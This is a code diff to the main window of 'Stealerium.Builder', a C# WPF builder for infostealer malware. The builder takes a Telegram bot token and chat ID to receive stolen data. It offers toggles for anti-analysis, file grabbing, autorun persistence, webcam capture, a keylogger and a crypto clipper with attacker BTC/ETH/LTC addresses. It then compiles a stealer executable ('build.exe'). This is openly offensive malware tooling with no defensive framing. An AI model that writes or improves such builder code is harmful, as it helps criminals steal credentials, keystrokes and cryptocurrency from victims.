@@ -1,14 +1,20 @@
-using System.IO;
-using System.Net.Http;
+using System;
 using System.Windows;
 using System.Windows.Controls;
-using Microsoft.Win32;
+using System.Linq;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
 using System.Windows.Media;
 using Wpf.Ui.Controls;
+using System.Threading.Tasks;
+using System.Net.Http;
+using Microsoft.Win32;
+using Wpf.Ui;
 
 namespace Stealerium.Builder
 {
-    public partial class MainWindow
+    public partial class MainWindow : FluentWindow
     {
         private string stubPath = string.Empty;
         private bool isStubDetected = false;
@@ -25,25 +31,32 @@ namespace Stealerium.Builder
         private void InitializeUI()
         {
             // Set initial states
+            StubStatusLabel.IsOpen = false;
             WebhookStatusLabel.IsOpen = false;
+            ChatIdTextBox.IsEnabled = false;
+
+            // Set tooltips for better UX
             ApiTokenTextBox.PlaceholderText = "Enter your Telegram bot API token";
             ChatIdTextBox.PlaceholderText = "Enter your Telegram chat ID";
 
-            // Set tooltips for better UX
-            DebugCheckBox.ToolTip = "Enable detailed error logging to a file";
-            AntiAnalysisCheckBox.ToolTip = "Implement anti-analysis measures";
-            StartDelayCheckBox.ToolTip = "Add random delay on startup";
-            GrabberCheckBox.ToolTip = "Enable file grabbing functionality";
-            StartupCheckBox.ToolTip = "Install the application to run on system startup";
-            
+            DebugCheckBox.ToolTip = "Enable debug mode for detailed logging";
+            AntiAnalysisCheckBox.ToolTip = "Enable anti-analysis protection";
+            RandomStartDelayCheckBox.ToolTip = "Add random delay on startup";
+            FileGrabberCheckBox.ToolTip = "Enable file grabber functionality";
+            AutorunCheckBox.ToolTip = "Enable autorun on system startup";
+            WebcamCheckBox.ToolTip = "Enable webcam screenshot capture";
+            KeyloggerCheckBox.ToolTip = "Enable keylogger functionality";
+            ClipperCheckBox.ToolTip = "Enable crypto clipper functionality";
+
             // Set initial button states
             TestTelegramButton.IsEnabled = false;
             BuildButton.IsEnabled = false;
 
-            // Initialize advanced options as disabled
-            WebcamScreenshotCheckBox.IsEnabled = false;
-            KeyloggerCheckBox.IsEnabled = false;
-            ClipperCheckBox.IsEnabled = false;
+            // Show welcome message
+            BuildStatusLabel.Title = "Welcome";
+            BuildStatusLabel.Message = "Configure your build settings and click Build when ready.";
+            BuildStatusLabel.Severity = InfoBarSeverity.Informational;
+            BuildStatusLabel.IsOpen = true;
         }
 
         private void CheckStubFile()
@@ -86,6 +99,7 @@ namespace Stealerium.Builder
             if (string.IsNullOrEmpty(token))
             {
                 isApiTokenValid = false;
+                ChatIdTextBox.IsEnabled = false;
                 WebhookStatusLabel.Title = "Validation Error";
                 WebhookStatusLabel.Message = "Telegram API token cannot be empty";
                 WebhookStatusLabel.Severity = InfoBarSeverity.Warning;
@@ -96,20 +110,22 @@ namespace Stealerium.Builder
 
             LoadingOverlay.Visibility = Visibility.Visible;
             isApiTokenValid = await Telegram.TokenIsValidAsync(token);
-            
+
             if (isApiTokenValid)
             {
+                ChatIdTextBox.IsEnabled = true;
                 WebhookStatusLabel.Title = "Validation Success";
                 WebhookStatusLabel.Message = "Telegram API token is valid";
                 WebhookStatusLabel.Severity = InfoBarSeverity.Success;
             }
             else
             {
+                ChatIdTextBox.IsEnabled = false;
                 WebhookStatusLabel.Title = "Validation Error";
                 WebhookStatusLabel.Message = "Invalid Telegram API token";
                 WebhookStatusLabel.Severity = InfoBarSeverity.Error;
             }
-            
+
             WebhookStatusLabel.IsOpen = true;
             LoadingOverlay.Visibility = Visibility.Collapsed;
             UpdateBuildButtonState();
@@ -143,7 +159,7 @@ namespace Stealerium.Builder
 
             LoadingOverlay.Visibility = Visibility.Visible;
             isChatIdValid = await ValidateChatIdAsync(token, chatId);
-            
+
             if (isChatIdValid)
             {
                 WebhookStatusLabel.Title = "Validation Success";
@@ -156,7 +172,7 @@ namespace Stealerium.Builder
                 WebhookStatusLabel.Message = "Invalid Telegram chat ID";
                 WebhookStatusLabel.Severity = InfoBarSeverity.Error;
             }
-            
+
             WebhookStatusLabel.IsOpen = true;
             LoadingOverlay.Visibility = Visibility.Collapsed;
             UpdateBuildButtonState();
@@ -230,17 +246,114 @@ namespace Stealerium.Builder
             UpdateBuildButtonState();
         }
 
-        private void StartupCheckBox_Checked(object sender, RoutedEventArgs e)
+        private async void BuildButton_Click(object sender, RoutedEventArgs e)
         {
-            WebcamScreenshotCheckBox.IsEnabled = true;
+            BuildButton.IsEnabled = false;
+            BuildProgressBar.Visibility = Visibility.Visible;
+            LoadingOverlay.Visibility = Visibility.Visible;
+            BuildStatusLabel.IsOpen = false;
+
+            try
+            {
+                // Validate Telegram settings
+                if (string.IsNullOrWhiteSpace(ApiTokenTextBox.Text) || string.IsNullOrWhiteSpace(ChatIdTextBox.Text))
+                {
+                    BuildStatusLabel.Title = "Validation Error";
+                    BuildStatusLabel.Message = "Please enter both Telegram Bot API Token and Chat ID.";
+                    BuildStatusLabel.Severity = InfoBarSeverity.Error;
+                    BuildStatusLabel.IsOpen = true;
+                    return;
+                }
+
+                // Set configuration values
+                Build.ConfigValues["TelegramAPI"] = Crypt.EncryptConfig(ApiTokenTextBox.Text.Trim());
+                Build.ConfigValues["TelegramID"] = Crypt.EncryptConfig(ChatIdTextBox.Text.Trim());
+                Build.ConfigValues["Debug"] = DebugCheckBox.IsChecked == true ? "1" : "0";
+                Build.ConfigValues["AntiAnalysis"] = AntiAnalysisCheckBox.IsChecked == true ? "1" : "0";
+                Build.ConfigValues["StartDelay"] = RandomStartDelayCheckBox.IsChecked == true ? "1" : "0";
+                Build.ConfigValues["Grabber"] = FileGrabberCheckBox.IsChecked == true ? "1" : "0";
+                Build.ConfigValues["Startup"] = AutorunCheckBox.IsChecked == true ? "1" : "0";
+                Build.ConfigValues["WebcamScreenshot"] = WebcamCheckBox.IsChecked == true ? "1" : "0";
+                Build.ConfigValues["Keylogger"] = KeyloggerCheckBox.IsChecked == true ? "1" : "0";
+                Build.ConfigValues["Clipper"] = ClipperCheckBox.IsChecked == true ? "1" : "0";
+
+                if (Build.ConfigValues["Clipper"] == "1")
+                {
+                    if (string.IsNullOrWhiteSpace(ClipperBTCTextBox.Text) && 
+                        string.IsNullOrWhiteSpace(ClipperETHTextBox.Text) && 
+                        string.IsNullOrWhiteSpace(ClipperLTCTextBox.Text))
+                    {
+                        BuildStatusLabel.Title = "Validation Error";
+                        BuildStatusLabel.Message = "Please enter at least one cryptocurrency address for the clipper.";
+                        BuildStatusLabel.Severity = InfoBarSeverity.Error;
+                        BuildStatusLabel.IsOpen = true;
+                        return;
+                    }
+
+                    Build.ConfigValues["ClipperBTC"] = Crypt.EncryptConfig(ClipperBTCTextBox.Text.Trim());
+                    Build.ConfigValues["ClipperETH"] = Crypt.EncryptConfig(ClipperETHTextBox.Text.Trim());
+                    Build.ConfigValues["ClipperLTC"] = Crypt.EncryptConfig(ClipperLTCTextBox.Text.Trim());
+                }
+
+                SaveFileDialog saveFileDialog = new SaveFileDialog
+                {
+                    Title = "Save Built Stub",
+                    Filter = "Executable Files (*.exe)|*.exe",
+                    FileName = "build.exe"
+                };
+
+                if (saveFileDialog.ShowDialog() == true)
+                {
+                    try
+                    {
+                        var buildPath = Build.BuildStub(saveFileDialog.FileName, stubPath);
+                        BuildStatusLabel.Title = "Build Successful";
+                        BuildStatusLabel.Message = $"Stealer built successfully and saved to: {buildPath}";
+                        BuildStatusLabel.Severity = InfoBarSeverity.Success;
+                        BuildStatusLabel.IsOpen = true;
+                    }
+                    catch (Exception ex)
+                    {
+                        BuildStatusLabel.Title = "Build Failed";
+                        BuildStatusLabel.Message = $"Failed to build stealer: {ex.Message}";
+                        BuildStatusLabel.Severity = InfoBarSeverity.Error;
+                        BuildStatusLabel.IsOpen = true;
+                    }
+                }
+                else
+                {
+                    BuildStatusLabel.Title = "Build Cancelled";
+                    BuildStatusLabel.Message = "Build process was cancelled by user.";
+                    BuildStatusLabel.Severity = InfoBarSeverity.Warning;
+                    BuildStatusLabel.IsOpen = true;
+                }
+            }
+            catch (Exception ex)
+            {
+                BuildStatusLabel.Title = "Error";
+                BuildStatusLabel.Message = $"An unexpected error occurred: {ex.Message}";
+                BuildStatusLabel.Severity = InfoBarSeverity.Error;
+                BuildStatusLabel.IsOpen = true;
+            }
+            finally
+            {
+                BuildButton.IsEnabled = true;
+                BuildProgressBar.Visibility = Visibility.Collapsed;
+                LoadingOverlay.Visibility = Visibility.Collapsed;
+            }
+        }
+
+        private void AutorunCheckBox_Checked(object sender, RoutedEventArgs e)
+        {
+            WebcamCheckBox.IsEnabled = true;
             KeyloggerCheckBox.IsEnabled = true;
             ClipperCheckBox.IsEnabled = true;
         }
 
-        private void StartupCheckBox_Unchecked(object sender, RoutedEventArgs e)
+        private void AutorunCheckBox_Unchecked(object sender, RoutedEventArgs e)
         {
-            WebcamScreenshotCheckBox.IsEnabled = false;
-            WebcamScreenshotCheckBox.IsChecked = false;
+            WebcamCheckBox.IsEnabled = false;
+            WebcamCheckBox.IsChecked = false;
             KeyloggerCheckBox.IsEnabled = false;
             KeyloggerCheckBox.IsChecked = false;
             ClipperCheckBox.IsEnabled = false;
@@ -258,122 +371,6 @@ namespace Stealerium.Builder
             ClipperBTCTextBox.Text = string.Empty;
             ClipperETHTextBox.Text = string.Empty;
             ClipperLTCTextBox.Text = string.Empty;
-        }
-
-        private async void BuildButton_Click(object sender, RoutedEventArgs e)
-        {
-            await BuildStub();
-        }
-
-        private async Task BuildStub()
-        {
-            var token = ApiTokenTextBox.Text.Trim();
-            var chatId = ChatIdTextBox.Text.Trim();
-
-            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId))
-            {
-                var messageBox = new Wpf.Ui.Controls.MessageBox
-                {
-                    Title = "Build Error",
-                    Content = "Please enter both Telegram API token and chat ID."
-                };
-                await messageBox.ShowDialogAsync();
-                return;
-            }
-
-            // Set configuration values for build
-            Build.ConfigValues["TelegramAPI"] = Crypt.EncryptConfig(token);
-            Build.ConfigValues["TelegramID"] = Crypt.EncryptConfig(chatId);
-            Build.ConfigValues["Debug"] = DebugCheckBox.IsChecked == true ? "1" : "0";
-            Build.ConfigValues["AntiAnalysis"] = AntiAnalysisCheckBox.IsChecked == true ? "1" : "0";
-            Build.ConfigValues["Startup"] = StartupCheckBox.IsChecked == true ? "1" : "0";
-            Build.ConfigValues["StartDelay"] = StartDelayCheckBox.IsChecked == true ? "1" : "0";
-            Build.ConfigValues["Grabber"] = GrabberCheckBox.IsChecked == true ? "1" : "0";
-
-            if (Build.ConfigValues["Startup"] == "1")
-            {
-                Build.ConfigValues["WebcamScreenshot"] = WebcamScreenshotCheckBox.IsChecked == true ? "1" : "0";
-                Build.ConfigValues["Keylogger"] = KeyloggerCheckBox.IsChecked == true ? "1" : "0";
-                Build.ConfigValues["Clipper"] = ClipperCheckBox.IsChecked == true ? "1" : "0";
-            }
-            else
-            {
-                Build.ConfigValues["WebcamScreenshot"] = "0";
-                Build.ConfigValues["Keylogger"] = "0";
-                Build.ConfigValues["Clipper"] = "0";
-            }
-
-            if (Build.ConfigValues["Clipper"] == "1")
-            {
-                if (string.IsNullOrWhiteSpace(ClipperBTCTextBox.Text) && 
-                    string.IsNullOrWhiteSpace(ClipperETHTextBox.Text) && 
-                    string.IsNullOrWhiteSpace(ClipperLTCTextBox.Text))
-                {
-                    var messageBox = new Wpf.Ui.Controls.MessageBox
-                    {
-                        Title = "Build Error",
-                        Content = "Please enter at least one cryptocurrency address for the clipper."
-                    };
-                    await messageBox.ShowDialogAsync();
-                    return;
-                }
-
-                Build.ConfigValues["ClipperBTC"] = Crypt.EncryptConfig(ClipperBTCTextBox.Text.Trim());
-                Build.ConfigValues["ClipperETH"] = Crypt.EncryptConfig(ClipperETHTextBox.Text.Trim());
-                Build.ConfigValues["ClipperLTC"] = Crypt.EncryptConfig(ClipperLTCTextBox.Text.Trim());
-            }
-            else
-            {
-                Build.ConfigValues["ClipperBTC"] = "";
-                Build.ConfigValues["ClipperETH"] = "";
-                Build.ConfigValues["ClipperLTC"] = "";
-            }
-
-            SaveFileDialog saveFileDialog = new SaveFileDialog
-            {
-                Title = "Save Built Stub",
-                Filter = "Executable Files (*.exe)|*.exe",
-                FileName = "build.exe"
-            };
-
-            if (saveFileDialog.ShowDialog() == true)
-            {
-                try
-                {
-                    LoadingOverlay.Visibility = Visibility.Visible;
-                    var buildPath = Build.BuildStub(saveFileDialog.FileName, stubPath);
-                    BuildStatusLabel.Text = $"Build successful: {buildPath}";
-                    BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Green);
-                    
-                    var messageBox = new Wpf.Ui.Controls.MessageBox
-                    {
-                        Title = "Build Success",
-                        Content = $"Stub built successfully and saved to:\n{buildPath}"
-                    };
-                    await messageBox.ShowDialogAsync();
-                }
-                catch (Exception ex)
-                {
-                    BuildStatusLabel.Text = $"Build failed: {ex.Message}";
-                    BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Red);
-                    
-                    var messageBox = new Wpf.Ui.Controls.MessageBox
-                    {
-                        Title = "Build Error",
-                        Content = $"Failed to build stub:\n{ex.Message}"
-                    };
-                    await messageBox.ShowDialogAsync();
-                }
-                finally
-                {
-                    LoadingOverlay.Visibility = Visibility.Collapsed;
-                }
-            }
-            else
-            {
-                BuildStatusLabel.Text = "Build cancelled";
-                BuildStatusLabel.Foreground = new SolidColorBrush(Colors.Gray);
-            }
         }
     }
 }
